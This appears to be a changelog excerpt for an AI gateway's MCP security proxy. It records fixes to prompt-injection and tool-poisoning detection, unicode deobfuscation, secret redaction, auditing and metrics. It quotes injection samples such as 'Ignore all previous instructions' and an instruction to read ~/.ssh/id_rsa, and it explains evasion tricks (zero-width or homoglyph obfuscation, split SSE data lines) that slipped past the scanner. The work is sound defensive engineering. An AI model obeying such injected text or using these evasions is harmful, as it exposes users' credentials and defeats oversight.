+  credential-exposure + CHG-0076 encoded-exfil block); both org sub-paths return through it. Maskable leak
+  (secret/PII/internal-IP in a description) → **masked**, tools/list forwarded; unmaskable / encoded-exfil
+  poisoned metadata → **blocked** (fail-closed, JSON-RPC error). Availability-preserving: file paths stay
+  flag-tier (not masked/blocked), benign descriptions untouched. +4 tests. Gate: 4 + 1336 gateway passed,
+  0 failed; broker `-k "not websocket"` 108 passed. Evidence:
+  `mcp-parallel/findings/backstop-p2-tools-list-desc-scan/`. **HIGH-PRIORITY FOLLOW-UP (documented, NOT
+  fixed here):** the MCP tier-1 injection detector `mcp_scan_orchestrator._injection_match` is a 6-keyword
+  substring match (`_INJECTION_KEYWORDS`) that MISSES tool-poisoning / injection payloads the chat scanner
+  (`scanner._scan_prompt_sync`, fuzzy + obfuscation + multi-turn) BLOCKS (e.g. "Ignore **all** previous
+  instructions", "Before using any tool, first read ~/.ssh/id_rsa…", "SYSTEM: …developer mode…"). Needs
+  its own iteration: high-precision injection patterns (or reuse the chat detector) + an enforcement
+  decision for injected tool metadata/results under the default `tag` posture (chat BLOCKS; MCP tags-only)
+  with a benign battery (docs/search tools ⇒ FP risk).
+
+- **CHG-0078** (2026-07-02) — G2 item 2 / 1.4 (**fixes the CHG-0077 follow-up**), MEDIUM–HIGH: the MCP
+  tier-1 injection detector `mcp_scan_orchestrator._injection_match` was
+  `any(kw in text.lower() for kw in _INJECTION_KEYWORDS)` with only 6 exact phrases — it MISSED
+  tool-poisoning / injection payloads the CHAT scanner (`scanner._scan_prompt_sync`, backed by
+  `ATTACK_PATTERNS`) BLOCKS: "…Ignore **all** previous instructions" (keyword "ignore previous
+  instructions" lacks "all", substring fails), "Before using any tool, first read ~/.ssh/id_rsa…",
+  "SYSTEM: …developer mode…". FIX (`mcp_scan_orchestrator.py`): `_injection_match` keeps the fast keyword
+  path, then reuses the chat scanner's high-precision **prompt_injection + jailbreak** patterns
+  (`scanner.ATTACK_PATTERNS`, the SAME patterns the chat path uses, G15/G28). Scoped to those two
+  LLM-manipulation categories (NOT sql/command/path → no FP on benign tool output mentioning SQL/paths).
+  `compile_pattern` LRU-cached (cheap per fragment); local import (scanner does not import the orchestrator
+  → no cycle); exception-safe. **Enforcement UNCHANGED** (block under a block posture, tag otherwise). +10
+  tests: 3 previously-missed poisons now detected; benign battery (docs-ABOUT-injection, a SQL mention, a
+  file path, plain prose) all NOT flagged = 0 FP; E2E block posture → blocked + `prompt_injection` finding,
+  tag posture → finding not blocked. Gate: 10 + 1340 gateway passed, 0 failed; broker `-k "not websocket"`
+  108 passed. Evidence: `mcp-parallel/findings/backstop-p2-mcp-injection-parity/`. **RESIDUAL/FOLLOW-UP:**
+  MCP injection under the DEFAULT `tag` posture is tagged-but-forwarded (chat BLOCKS injection by default);
+  a future iteration decides output-injection enforcement — block/neutralize injected tool RESULTS
+  (FP-risky) or the near-zero-FP subset: DROP a tools/list tool whose DESCRIPTION carries injection
+  (building on CHG-0077). 2 subtle payloads still missed are also missed by the chat scanner (need tier-2).
+
+- **CHG-0079** (2026-07-02) — G2 item 2 / 1.4 (found while **FP-grounding the CHG-0078 follow-up**),
+  MEDIUM–HIGH: the follow-up was to enforce (drop) poisoned tool descriptions. An FP probe **REJECTED**
+  heuristic-drop — a legit "Detects jailbreak attempts and prompt injection" security-tool description
+  trips the injection patterns (FP), while the classic `<IMPORTANT>…read ~/.ssh/id_rsa…` poison is missed
+  by both — so the clean signal is **OBFUSCATION**, not injection-content heuristics. GAP: the chat scanner
+  deobfuscates via `scanner._normalize_unicode` before scanning, but `mcp_scan_orchestrator._scan_text_tier1`
+  ran `_injection_match` + `detect_secrets/…/ip_leakage` on RAW text. Invisible/confusable unicode —
+  zero-width chars (`I​g​n​o​r​e`), bidi-override, homoglyphs (fullwidth `Ｉ`, Cyrillic look-alikes),
+  the Unicode-tag block, combining marks — dodged the raw regexes (`redact_all` also doesn't strip
+  zero-width). So a zero-width-broken / homoglyph injection, or a secret / internal-IP hidden that way,
+  bypassed the MCP firewall while a markdown/model client reads the deobfuscated value. FIX
+  (`mcp_scan_orchestrator.py`): `_scan_text_tier1` computes `_deob = _normalize_unicode(text)` (decode
+  unicode-tags → strip zero-width & bidi → NFKC → drop combining marks → fold homoglyphs) and (a) runs
+  `_injection_match` on `_deob` too; (b) adds `_deob` to the CHG-0076 hidden-secret/credential/internal-IP
+  variant probe → an obscured secret/IP **blocks fail-closed** (redact_all can't mask the obfuscated run;
+  monitor stays observe-only). **ASCII fast-path** (`text.isascii()` short-circuits — the common case pays
+  nothing); local import (no cycle); injection enforcement unchanged. Extends CHG-0076 to a 2nd obfuscation
+  channel. +8 tests; **ZERO FP** on benign non-ASCII (emoji ZWJ family `👨‍👩‍👧`, Japanese, accented
+  café/résumé/naïve, plain ASCII — normalize is a detection-only probe, never mutates emitted bytes). Gate:
+  8 + 1350 gateway passed, 0 failed; broker `-k "not websocket"` 108 passed. Evidence:
+  `mcp-parallel/findings/backstop-p2-mcp-unicode-deobfuscation/`.
+
+- **CHG-0080** (2026-07-02) — G2 item 2 / 1.4 (**devil's-advocate on model-facing surfaces**), MEDIUM: the
+  MCP `initialize` result carries an `instructions` field the spec treats as model-facing guidance
+  ("thought of like a hint … may be added to the system prompt") + serverInfo — a tool-poisoning /
+  indirect-prompt-injection + metadata surface like tool descriptions (CHG-0077). The ORG path is **safe**
+  (`org_mcp_jsonrpc` SYNTHESIZES the initialize response — gateway serverInfo, no upstream instructions
+  forwarded). But the EXT transparent proxy (`ext_mcp_proxy`) scans a result only when the method is in
+  `_EXT_FINITE_RESULT_METHODS`, and `initialize` was **NOT** in it → the upstream's initialize response
+  (incl. model-facing `instructions` + serverInfo) was forwarded **RAW, unscanned**; a malicious external
+  server could put an injection/exfil instruction or a hidden secret/internal-IP in `instructions` and it
+  reached the model past the firewall. FIX (`mcp_proxy.py`): added `"initialize"` to
+  `_EXT_FINITE_RESULT_METHODS`. The finite handshake result now routes through the same result-redaction
+  floor as tool results, inheriting CHG-0074 (IP-network floor) + CHG-0075 (credential-exposure) + CHG-0076
+  (text-encoding exfil block) + CHG-0079 (invisible/confusable-unicode deobfuscation) + injection
+  detection/tagging (CHG-0078). initialize ARGS (client capabilities/clientInfo) NOT scanned (client-
+  provided). +5 tests (secret + internal-IP in initialize instructions masked + tagged INFRA,SECRET;
+  zero-width-hidden secret blocked fail-closed; injection detected; benign initialize unchanged). Gate: 5 +
+  1358 gateway passed, 0 failed; broker `-k "not websocket"` 108 passed. Evidence:
+  `mcp-parallel/findings/backstop-p2-ext-initialize-instructions/`. **RESIDUAL:** injection in
+  `instructions` is detected+tagged but not removed under the default `tag` posture (same output-injection
+  enforcement question as the CHG-0078 residual).
+
+- **CHG-0081** (2026-07-02) — G2 item 5/9 / 1.4 (**devil's-advocate on the …→tag→AUDIT chain end**),
+  MEDIUM audit-completeness: CHG-0077's `_scanned_tools_list_response` masks/blocks a poisoned
+  tool-description leak but had **ZERO** `_record_gateway_event` calls, while the tools/call path audits
+  heavily. So when the gateway REDACTED a secret/PII/internal-IP in a tool description, or BLOCKED a
+  poisoned tools/list (tool-poisoning / encoded-exfil), it recorded **no** MCPEvent → the most
+  forensically-important discovery-path security events were invisible to audit/SIEM (asymmetric with
+  tools/call + the ext-proxy audit CHG-0068/0070). FIX (`mcp_proxy.py`): `_scanned_tools_list_response`
+  now calls the best-effort `_record_gateway_event` on BLOCK xor REDACT (`tool_name="tools/list"`,
+  `reason="tools_list_metadata_scan"`, the compliance tags, the scan findings, and a threaded per-request
+  correlation id — new `request_id` param = `_mcp_request_correlation_id(request, msg_id)` from both org
+  sub-paths); a fully-CLEAN tools/list is NOT audited (no per-discovery noise). Fire-and-forget / no-op
+  without org (same `_record_gateway_event` → identical persistence + EnforcementEvent bridge). +3 tests
+  (secret/IP in a description → audited `decision=redact` w/ tags `INFRA,SECRET` + request-id; encoded-exfil
+  → audited `decision=block`; benign tools/list → NO audit event). Gate: 3 + 1363 gateway passed, 0 failed;
+  broker `-k "not websocket"` 108 passed. Evidence: `mcp-parallel/findings/backstop-p9-tools-list-audit/`.
+
+- **CHG-0082** (2026-07-02) — G2 item 5/9 / 1.4 (**bare-REST parity** — applying the CHG-0081 audit +
+  CHG-0077 scan lens to the other REST routes), MEDIUM. **(A)** `org_mcp_tool_call` (REST POST
+  `.../tools/call`, a primary tenant tool path) audited a result BLOCK but, on a REDACT, swapped the masked
+  content in **silently** (no `_record_gateway_event`) → a secret/PII/IP masked on the bare-REST tool-call
+  path was invisible to audit/SIEM, asymmetric with the block branch AND `org_mcp_jsonrpc`. **(B)**
+  `org_mcp_tools_list` (REST GET `.../tools`) FILTERED tools (enabled + per-key allowlist) but NEVER scanned
+  the tool descriptions, while the JSON-RPC `tools/list` already scans them (CHG-0077) → a
+  secret/PII/internal-IP (or encoded-exfil / tool-poisoning payload) in a tool description egressed on this
+  REST discovery endpoint. FIX (`mcp_proxy.py`): (A) record a `decision="redact"` gateway event (tags,
+  findings, request-id, latency) before swapping the masked result — mirroring the block branch. (B) run the
+  filtered tools through `_scan_tool_result_floor` (masks maskable leak; blocks unmaskable/encoded-exfil →
+  403 `tools_withheld`) + audit the block/redact (`reason="tools_list_metadata_scan"`); a clean list is NOT
+  audited. Reuses the whole floor chain (CHG-0074/0075/0076/0079); actor=None (descriptions not
+  actor-scoped). +3 tests (bare-REST tool call w/ a secret result → masked AND audited `decision=redact`;
+  REST tools-list w/ secret+IP in a description → masked + audited redact; benign REST tools-list →
+  unchanged, no audit). Gate: 3 + 1369 gateway passed, 0 failed; broker `-k "not websocket"` 108 passed.
+  Evidence: `mcp-parallel/findings/backstop-p9-bare-rest-parity/`.
+
+- **CHG-0083** (2026-07-02) — G2 item 2 / 1.4 (**found by a category×obfuscation regression-matrix
+  pre-flight** — strict: obfuscated secret/cred/IP MUST block), HIGH: several CREDENTIALS live in
+  `PII_PATTERNS` (detected by `detect_pii`, NOT `detect_secrets`) — `aws_access_key` (AKIA/ASIA),
+  `aws_secret_access_key`, `api_key_openai`, `github_token`, `private_key_header`. The CHG-0076
+  (text-encoding) + CHG-0079 (invisible/confusable-unicode) encoded-exfil BLOCK computed `_hidden` from
+  `detect_secrets` + `detect_credential_exposure` + `detect_ip_leakage∩_INFRA_NETWORK_KEYS` — so an
+  OBFUSCATED AWS/GitHub/OpenAI key (HTML-entity / zero-width / homoglyph) slipped past the block while its
+  RAW form masks (the decode reveals the key but `_hidden` never ran `detect_pii` on the decoded variant; a
+  markdown/model client reads it deobfuscated). FIX (`mcp_scan_orchestrator.py`): the encoded-exfil
+  `_hidden` probe now also includes decoded `detect_pii` matches whose compliance tag is **SECRET** (the
+  credentials-misfiled-as-PII set). Generic PII (email/phone/ssn/cc → GDPR/PII/HIPAA/PCI-DSS, never SECRET)
+  is EXCLUDED so an entity-encoded scraped-HTML contact email/SSN does not false-block a legit web/HTML tool
+  result (consistent w/ CHG-0076's PII exclusion); the SECRET-tag filter is the principled near-zero-FP
+  boundary. +27 tests (obfuscated AKIA/ASIA/`ghp_`/`sk-proj-` via HTML-entity+zero-width → BLOCK; obfuscated
+  generic email/SSN/phone → NOT blocked; raw AWS key still masked; a durable adversarial matrix of 12
+  sensitive categories raw→masked/blocked + benign→unchanged). Gate: 27 + 1369 gateway passed, 0 failed;
+  broker `-k "not websocket"` 108 passed. Evidence: `mcp-parallel/findings/backstop-p2-obfuscated-cred-in-pii/`.
+  **RESIDUAL:** aws_access_key etc. really belong in SECRET_PATTERNS (future cleanup, touches detect_*
+  semantics + tag map across sessions); obfuscated SSN/credit-card still not blocked by the encoded path
+  (SECRET-tagged only; raw forms mask).
+
+- **CHG-0084** (2026-07-02) — ARCH item 11 (**PostgreSQL + Redis correctness**) / soak item 16 (found by a
+  Redis-correctness sweep applying the CHG-0062 lens), MEDIUM: `leakage_detector.py`
+  `LeakageDetector.track_cross_request` tracks cross-request sensitive-fragment hashes in a Redis SET
+  (`leakage:cross:{key_hash}`) with a window TTL, but did per-fragment `await sadd(...)` (N round-trips)
+  then a **SEPARATE** `await expire(...)`. A coroutine cancellation (client disconnect under load — routine
+  at scale) or a transient Redis error between the last sadd and the expire leaves the SET populated with
+  **NO TTL** → orphaned forever → unbounded Redis memory under soak (item 16) → exhaustion. Same class as
+  CHG-0062's non-atomic INCR+EXPIRE. FIX (`leakage_detector.py`): one `MULTI/EXEC`
+  (`pipeline(transaction=True)`) sets all fragment members + the window TTL **atomically** → the key can
+  never be left without a TTL (and 1 round-trip, not N+1). Sliding-window semantics preserved (EXPIRE re-set
+  each call, no `nx`); fail-safe unchanged (0.0 when `_redis is None` / no fragments; benign text → no
+  writes). +3 tests (exactly one `transaction=True` pipeline carrying SADD+EXPIRE; the set key ALWAYS has a
+  TTL; no-redis → 0.0; benign → no writes). Gate: 3 + 1421 gateway passed, 0 failed; broker
+  `-k "not websocket"` 108 passed. Evidence: `mcp-parallel/findings/backstop-p11-leakage-detector-ttl-leak/`.
+  **RESIDUAL:** `circuit_breaker.py` uses `pipeline(transaction=False)` for INCR+EXPIRE (batched in one
+  write, small orphan window) — lower priority; other MCP Redis keys already carry TTLs (CHG-0023/0062).
+
+- **CHG-0085** (2026-07-02) — ARCH credential-at-rest (**found by a security review of the MCP OAuth
+  proxy**), HIGH: `mcp_oauth_proxy._write_mcp_remote_tokens` persists mcp-remote token files under
+  `/tmp/mcp-orgs/{org}/mcp-auth/…` — `{hash}_tokens.json` (**access_token + refresh_token**),
+  `{hash}_client_info.json` (**client_secret**), `{hash}_code_verifier.txt` (**PKCE code_verifier**) — via
+  `Path.write_text` + `mkdir(parents=True, exist_ok=True)` with DEFAULT perms. Verified on-host:
+  `write_text` → **0664** (group+world readable), `mkdir` → **0775** (world-traversable). So a co-located
+  process / user / neighbouring tenant on the shared gateway host could read another org's OAuth credentials
+  at rest → upstream-MCP account takeover. (The Redis copies were already encrypted at rest per CHG-0042;
+  the on-disk copies were unprotected.) FIX (`mcp_oauth_proxy.py`): new `_write_secure_text(path, content)`
+  creates each file via `os.open(..., O_CREAT, 0o600)` (restrictive mode applied at creation — no
+  world-readable window; 0600 is umask-proof) + re-chmod 0600; `_write_mcp_remote_tokens` chmods the whole
+  org credential tree (`/tmp/mcp-orgs/{org}`, `mcp-auth`, each `mcp-remote-{ver}`) to **0700** (idempotent;
+  also tightens dirs `mkdir(exist_ok=True)` would leave at their old looser mode; 0700 on the org dir blocks
+  another user from traversing in). Content unchanged. +2 tests (all dirs 0700 + files 0600; `os.walk` over
+  the org tree finds ZERO group/world-accessible paths; secrets intact; `_write_secure_text` tightens a
+  pre-existing 0644 file to 0600 on re-write). Gate: 2 + 1449 gateway passed, 0 failed; broker
+  `-k "not websocket"` 108 passed. Evidence: `mcp-parallel/findings/backstop-p12-oauth-token-file-perms/`.
+  **RESIDUAL:** files live under `/tmp` on the OAuth-callback host — owner-only perms close the shared-host
+  read vector; a stronger posture writes them inside the per-tenant gVisor sandbox FS (item 12, future);
+  consider shredding on token revocation.
+
+- **CHG-0086** (2026-07-02) — ARCH item 11 (**PostgreSQL + Redis correctness**; closes the CHG-0084
+  residual), LOW–MEDIUM: `circuit_breaker.py` used `pipeline(transaction=False)` at **4** sites that INCR
+  (or DELETE) + EXPIRE — `record_success` (total), `record_error` (total + errors), `_bump_epoch` (epoch +
+  probes DELETE), `_admit_probe` (admit — whose docstring says *"Atomically claim a probe slot"* yet the
+  INCR+EXPIRE were not wrapped). A non-transactional pipeline batches but does NOT MULTI/EXEC, so a
+  connection drop mid-write (INCR sent, EXPIRE not) orphans the counter with **no TTL** (same class as
+  CHG-0062/0084). Counters are per-model (bounded) → smaller impact than CHG-0084, but atomic TTL-setting is
+  the correct pattern and `_admit_probe`'s "atomic" contract was unmet. FIX (`circuit_breaker.py`): all 4 →
+  `pipeline(transaction=True)` (MULTI/EXEC) so INCR (+DELETE) and its EXPIRE commit atomically; the counter
+  can never be left without a TTL. `execute()` still returns per-command results (`record_error` reads
+  `results[0]`/`results[2]`, `_admit_probe` reads `results[0]`) — verified by the existing 24 breaker tests.
+  +1 test (record_success/error pipelines are `transaction=True` with paired INCR+EXPIRE). Gate: 1 + 1454
+  gateway passed, 0 failed; broker `-k "not websocket"` 108 passed. Evidence:
+  `mcp-parallel/findings/backstop-p11-circuit-breaker-atomicity/`. **RESIDUAL:** all gateway INCR/SADD+EXPIRE
+  on the MCP/rate-limit/breaker paths are now atomic (CHG-0062/0084/0086); `oauth_proxy`/`model_state` use
+  `setex`/`set(ex=)` (atomic by construction). No remaining non-atomic TTL-setter found.
+
+- **CHG-0087** (2026-07-02) — ARCH item 13 (**Phase-3 monitoring/metrics**), MEDIUM: the gateway HAS a
+  Prometheus layer (`metrics.py`, `/metrics`, counters for requests/policy-blocks/rate-limit/kill-switch/
+  stream/chat) but there was **no MCP metric** and `mcp_proxy.py` imported/called `metrics` **nowhere**.
+  Every MCP scan/enforcement decision (block/redact/allow/monitor — tool-poisoning, credential force-blocks,
+  PII/IP redaction, tools/list metadata scans, org-scope violations) is written to the MCPEvent **audit**
+  trail but was never **metered**, so Prometheus dashboards + alerting could not see MCP block/redact rates,
+  volume, or compliance-tag distribution — the 1.4 guardrails were invisible to metrics-based monitoring.
+  FIX (`metrics.py` + `mcp_proxy.py`): two low-cardinality counters —
+  `amf_gateway_mcp_scan_decisions_total{org, decision}` (block/redact/allow/monitor) and
+  `amf_gateway_mcp_compliance_tags_total{org, tag}` (SECRET/PII/INFRA/HIPAA/PCI-DSS/SOC2/GDPR...) — plus
+  `record_mcp_scan_decision(org, decision, tags)` (fail-safe no-op without prometheus_client,
+  `_safe_label`-bounded), wired into `_record_gateway_event` (best-effort try/except so metrics NEVER break
+  the request path). Every audited MCP decision is now also metered + rendered in `/metrics`. +4 tests
+  (increments decision + per-tag counters; the audit sink moves the counter; empty-tags/empty-org safe;
+  no-op when prometheus_client absent). Gate: 4 + 1455 gateway passed, 0 failed; broker
+  `-k "not websocket"` 108 passed. Evidence: `mcp-parallel/findings/backstop-p13-mcp-scan-metrics/`.
+  **RESIDUAL:** an MCP scan/call latency histogram + OpenTelemetry tracing for the per-call chain are
+  separate item-13 enhancements (the audit already carries `latency_ms`).
+
+- **CHG-0088** (2026-07-02) — ARCH item 13/20 (**monitoring**; completes the CHG-0087 residual), LOW–MEDIUM:
+  CHG-0087 added MCP scan-decision + compliance-tag COUNTERS but no latency metric. `_record_gateway_event`
+  already carries `latency_ms` (16+ sites pass `int((time.time()-call_t0)*1000)`), yet MCP tool-call latency
+  was never exposed to Prometheus — so dashboards/alerting couldn't see MCP p50/p95/p99, exactly what "1.4
+  guardrails holding under peak load" (item 20) needs. FIX (`metrics.py` + `mcp_proxy.py`): new
+  `amf_gateway_mcp_call_seconds{org, decision}` Histogram (buckets 5ms…10s); `record_mcp_scan_decision(...)`
+  gains a `latency_ms` param and observes `latency_ms/1000` **only when truthy** (so paths that don't time
+  the call — e.g. the tools/list metadata-scan audit — don't skew the low bucket with 0s samples).
+  `_record_gateway_event` passes `latency_ms` (still best-effort try/except so metrics never break the
+  request path). +2 tests (2 block decisions @125ms+340ms → count +2 / sum 0.465s; latency 0/None/omitted →
+  no observation; audit sink records one; no-op without prometheus_client). Gate: 6 + 1461 gateway passed,
+  0 failed; broker `-k "not websocket"` 108 passed. Evidence:
+  `mcp-parallel/findings/backstop-p13-mcp-latency-histogram/`. **RESIDUAL:** OpenTelemetry tracing for the
+  per-call chain remains a separate item-13 piece; a few audit calls (tools/list metadata scan, ext-proxy
+  `_ext_audit`) don't pass `latency_ms` yet (minor follow-up).
+
+- **CHG-0089** (2026-07-02) — ARCH item 13/20 (**monitoring**; metrics-coverage sweep after CHG-0087/0088),
+  MEDIUM: `metrics.record_rate_limit` is called ONLY from the chat handler (`main.py`, per-MODEL limiter).
+  The per-ORG TPM/burst/RPM limiter (`_enforce_org_tpm_rate_limit`/`_enforce_org_burst_rpm`) doesn't meter
+  internally, and the MCP path (`_mcp_org_rate_limit_raw`) returned a plain 429 with **no metric**. So MCP
+  tool calls throttled by the per-org ceiling (CHG-0031/0032) were recorded nowhere in Prometheus — an MCP
+  429 storm under the mandate's 5k–10k concurrent tool calls was invisible to dashboards/alerting. FIX
+  (`mcp_proxy.py`): `_mcp_org_rate_limit_raw`, when it returns a 429 (TPM or burst/RPM), calls
+  `record_mcp_scan_decision(org, "rate_limited")` — MCP throttling now lands in the same
+  `amf_gateway_mcp_scan_decisions_total{org, decision}` series as block/redact/allow/monitor. Best-effort
+  try/except (metrics never break the request path). The TPM→burst **short-circuit** + the allow (None) path
+  are preserved by the refactor. +4 tests (TPM trip → 429 + metered + burst short-circuited; burst trip →
+  metered; allowed → None + no metering; None auth → no-op). Gate: 4 + 14 (test_mcp_rate_limit) + 1501
+  gateway passed, 0 failed; broker `-k "not websocket"` 108 passed. Evidence:
+  `mcp-parallel/findings/backstop-p13-mcp-ratelimit-metric/`. **RESIDUAL:** metering
+  `_enforce_org_tpm_rate_limit` INTERNALLY (chat + MCP callers all meter) would be a cleaner future refactor.
+
+- **CHG-0090** (2026-07-02) — 1.4 / **item-20 concurrency dimension** (verification + regression-lock, ZERO
+  defects found): item 20 requires the 1.4 guardrails to hold under peak load. The 300–500-sandbox ×
+  5k–10k-concurrent-call SCALE is host-blocked here, but the guardrails' concurrency-SAFETY is provable —
+  the MCP scan/redact chain (`_scan_tool_result_floor` → mcp_scan_orchestrator → `redact_all`) runs against
+  MODULE-LEVEL state (compiled-pattern LRU cache, enabled-tools / server-config caches); if any were mutated
+  per-scan or shared across coroutines without isolation, a race could CROSS-CONTAMINATE concurrent scans —
+  one request's secret/PII leaking into another's redacted result. A single-call unit test can't catch it.
+  NEW TEST (`test_mcp_scan_concurrency_safety.py`): fires 300 concurrent `_scan_tool_result_floor` calls
+  (`asyncio.gather`), each with a UNIQUE canary secret (`sk-ant-CANARY####…`) + PII (`user####@…`) +
+  internal IP across 10 orgs, and asserts (a) every call's OWN canary is masked (0 own-canary leaks) and (b)
+  NO call's result contains ANY OTHER call's canary (0 cross-contamination); + a 100-way benign concurrent
+  run that must pass through unchanged. RESULT: **0 leaks, 0 cross-contamination** → the chain is
+  effectively stateless/isolation-safe under concurrency. Durable regression backstop: a future edit
+  introducing shared mutable state into the hot scan path flips this red. Gate: 2 + 1527 gateway passed,
+  0 failed; broker `-k "not websocket"` 108 passed. Evidence:
+  `mcp-parallel/findings/backstop-p20-1.4-concurrency-safety/`. **HONESTY NOTE:** proves concurrency-SAFETY
+  of the guardrails, NOT the full 300–500-sandbox / 5k–10k live stress (items 14–20) — still host-blocked,
+  owned by the live load harnesses (CP47–50).
+
+- **CHG-0091** (2026-07-03) — **HIGH fail-open 1.4 leak**: MCP adapter (stdio/websocket) ERROR-envelope tool
+  result. On `org_mcp_jsonrpc`'s adapter tools/call path the output scan target is `_scan_target =
+  payload.get("result") if "result" in payload else payload` — so a BARE JSON-RPC ERROR envelope
+  (`{"jsonrpc","id","error":{…}}`, NO `result` key — the standard response an MCP upstream returns on tool
+  FAILURE) IS scanned whole and a secret/PII/internal-IP in `error.message` IS detected + tagged. BUT all
+  three output swap branches (redact / redaction-FLOOR condition / floor swap) were gated on `"result" in
+  payload` → for an error envelope the redacted output was computed then **DISCARDED** and the RAW error
+  egressed. Under the default "tag" posture the FLOOR is the operative masker and its gate was exactly the
+  one excluding error envelopes (confirmed: `postgres://svc:ghp_…@10.0.0.5/prod` in `error.message` detected
+  `INFRA,SECRET,SOC2` yet raw). streamable-http path unaffected (swaps `_scanned_content` back
+  unconditionally). **FIX:** dropped the `"result" in payload` guard from the floor condition; both
+  redact-swap branches now write back to the WHOLE envelope when no `result` key (`payload = _scanned_out` /
+  `_scanned_floor`), keeping audited `reason` in sync with the masked message. Now a bare error egress is
+  MASKED (or fail-CLOSED blocked on an unmaskable survivor). NEW TEST
+  `test_mcp_adapter_error_envelope_redaction.py` (5): redacted-under-tag / benign-unchanged / flag-off-raw /
+  monitor-wins / unmaskable→[BLOCKED]. Gate: 5 + 1534 gateway passed, 0 failed; broker 108. Byte-truth:
+  fixed egress `[CONNECTION_STRING_REDACTED]`, flag-off egress still `ghp_…@10.0.0.5`. Independent oracle
+  (aidefence, decoupled from patterns.py): email/SSN error envelope → `has_pii` false fixed / true raw. touched:
+  owning-session mcp_proxy.py (extends CHG-0074/E12 floor to the error shape). VERIFY:
+  `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_adapter_error_envelope_redaction.py -q`.
+  Evidence `mcp-parallel/findings/backstop-p-adapter-error-envelope/`. RESIDUAL: tools/LIST adapter
+  fall-through (~L2943 raw return on non-tools-shaped payload) is the same class, lower probability — noted.
+  → **CLOSED by CHG-0092.**
+
+- **CHG-0092** (2026-07-03) — **MEDIUM fail-open 1.4 leak, the CHG-0091 TWIN (closes the class)**: MCP adapter
+  tools/**LIST** fall-through in `org_mcp_jsonrpc` (the `return adapter_resp` after the tools-shaped branch).
+  Upstream tool DESCRIPTIONS are scanned only when the payload is tools-shaped (`_scanned_tools_list_response`,
+  CHG-0077/0081); any NON-tools-shaped payload — a bare JSON-RPC error envelope (auth-failure tools/list errors
+  realistically echo a token/URL/PII), or a malformed result — fell through to `return adapter_resp` UNSCANNED
+  → a secret/PII/internal-IP in `error.message` egressed raw. **FIX:** before the fall-through, scan the whole
+  payload via `_scan_tool_result_floor` (same floor as CHG-0091), mirroring `_scanned_tools_list_response`:
+  masked → redacted envelope; unmaskable survivor → fail-CLOSED withheld (generic error); clean → raw
+  passthrough (no change for benign errors); audit block/redact (`reason="tools_list_error_scan"`,
+  `enforced_at="gateway_adapter"`). +3 tools/list tests. Gate: 8 (5 tools/call + 3 tools/list) + 1538 gateway
+  passed, 0 failed; broker 108. Byte-truth: tools/list error egress `b***@c***.example` / `***-**-4321` (raw
+  `bob.jones@corp.example` / `987-65-4321`); AWS-key+IP variant both masked. Independent oracle (aidefence):
+  `has_pii` false fixed / true raw. touched: owning-session mcp_proxy.py (extends CHG-0077/0081/0091). VERIFY
+  `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_adapter_error_envelope_redaction.py -q`.
+  Evidence `mcp-parallel/findings/backstop-p-toolslist-error-envelope/`. NOTE: a `ghp_…` looked unmasked → a
+  test-token defect (pattern `\bghp_[a-zA-Z0-9]{36}\b`, exactly 36; a valid 36-char github token IS masked via
+  detect_pii→floor), NOT a code gap.
+
+- **CHG-0093** (2026-07-03) — **HIGH fail-open 1.4 leak: SSE multi-line `data:` split** evades the MCP
+  tool-result scanner (`_scan_reframe_sse_tool_result`). Per the WHATWG SSE spec an event's data is the
+  concatenation of ALL its `data:` field values joined by `"\n"`. The reframer walked the buffered SSE
+  line-by-line and parsed EACH `data:` line as standalone JSON, so an untrusted upstream could SPLIT its
+  JSON-RPC result across several `data:` lines at a STRUCTURAL point (JSON whitespace between tokens): each
+  fragment is invalid JSON alone → the per-line `json.loads` raised → the frame fell through to "not JSON →
+  pass verbatim" (UNSCANNED), yet a spec-compliant client reassembles the fragments (joined by `\n`, valid
+  JSON whitespace) into the COMPLETE result → secret/PII egressed raw. **FIX:** parse the buffered SSE PER
+  EVENT (blank-line boundaries), reassemble each event's `data:` values with `\n` BEFORE json-parse + scan via
+  `_scan_tool_result_floor`; redact → re-emit non-`data:` field lines (`event:`/`id:`/comments) verbatim + the
+  masked payload as ONE `data:` line; unmaskable survivor → fail-CLOSED withhold; clean/keep-alive/non-JSON →
+  verbatim. Covers `result` + `error` frames. NEW TEST `test_mcp_sse_multiline_split.py` (7). Gate: 7 + 1540
+  gateway passed, 0 failed; broker 108. Byte-truth (client-reassembled): fixed `c***@c***.example` /
+  `***-**-7788` (raw `carol.roe@corp.example` / `555-66-7788`); AWS-key+IP variant masked. Independent oracle
+  (aidefence): `has_pii` false fixed / true raw. touched: owning-session mcp_proxy.py (extends
+  CHG-0039/0043/0064/0070). Evidence `mcp-parallel/findings/backstop-p-sse-multiline-split/`. NOTE: the E14
+  streaming-split suite covers the CHAT `SecureStreamingResponse` guard — a DIFFERENT mechanism; this MCP SSE
+  reframer split-gap was uncovered.
+
+- **CHG-0094** (2026-07-03) — **MEDIUM audit-completeness gap: MCP audit backpressure dropped SECURITY
+  audits under load**. `_spawn_audit_event` (mcp_proxy.py) sheds audit POSTs at inflight ≥
+  `_AUDIT_MAX_INFLIGHT`(64) — correct backpressure — but INDISCRIMINATELY: under 5k–10k concurrent calls +
+  slow control the 64 slots fill and `block`/`redact`/`rate_limited`/`error` audits drop too. An attack
+  producing many blocks fills the queue and drops the very block/redact audits it created → the
+  `…→tag→AUDIT` chain breaks silently (only a `LOG.warning`, no metric). **FIX:** priority-aware shedding —
+  security decisions get a higher ceiling (`_AUDIT_MAX_INFLIGHT_HIGH=256`, env-overridable) so the
+  high-volume `allow`/`monitor`/`clean` records shed first and the security audits survive; the shared
+  counter still bounds total inflight to 256 (memory bounded). + new metric
+  `amf_gateway_mcp_audit_dropped_total{priority,decision}` (`metrics.record_mcp_audit_dropped`, fail-safe) —
+  a non-zero `priority="high"` series = a lost security audit, alertable. `_spawn_audit_event` reads
+  `payload["decision"]` (already present) → no caller change. NEW TEST
+  `test_mcp_audit_backpressure_priority.py` (5). Gate: 5 + 1552 gateway passed, 0 failed; broker 108. touched:
+  owning-session proxy audit sink (CP49) + CHG-0087/0088 metrics. Evidence
+  `mcp-parallel/findings/backstop-p-audit-backpressure-priority/`. (Observability fix — no content leak, so no
+  aidefence oracle; proof is the shed-decision + drop-metric behavior test.)
+
+- **CHG-0095** (2026-07-03) — **MEDIUM audit-completeness gap: ext-proxy infra-error WITHHOLD/redact
